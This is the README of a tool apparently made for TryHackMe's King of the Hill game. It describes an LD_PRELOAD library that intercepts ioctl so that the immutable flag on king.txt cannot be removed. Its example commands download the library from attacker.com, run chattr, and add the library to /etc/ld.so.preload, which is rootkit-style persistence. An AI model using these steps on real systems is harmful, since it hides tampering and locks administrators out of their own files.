# KingsGuard

## Description
KingsGuard is a utility designed for use in tryhackme's king of the hill. It prevents anyone (even root) from writing to the king.txt file. First you write your name to the king.txt flag. Then change the file attributes to make it immutable (unchangeable even by root): `root@ubuntu:~# chattr +i /root/king.txt`. Now it's the library's job to prevent anyone else from changing the attribute back. It does this by intercepting any calls to the ioctl system call made by system binaries. The king.txt is still readable but not writable.

## Example
`$ curl http://attacker.com/kingsguard.so --output /usr/lib/kingsguard.so`
 
`$ echo 31337h4x0r > /root/king.txt`
 
`$ chattr +i /root/king.txt`
 
`$ echo '/usr/lib/kingsguard.so' > /etc/ld.so.preload`

## Limitations
- Kingsguard doesn't affect statically compiled binaries. Only dynamically compiled ones. This isn't generally an issue though since most binaries on most systems that I've come across are dynamically compiled.
- The root user can remove the library itself or remove the /etc/ld.so.preload entry that makes all binaries load the libary.
- The LD_PRELOAD function hooking technique isn't new. It has been around for a long time. Take a look at the Jynx rootkit for more examples of this same technique.
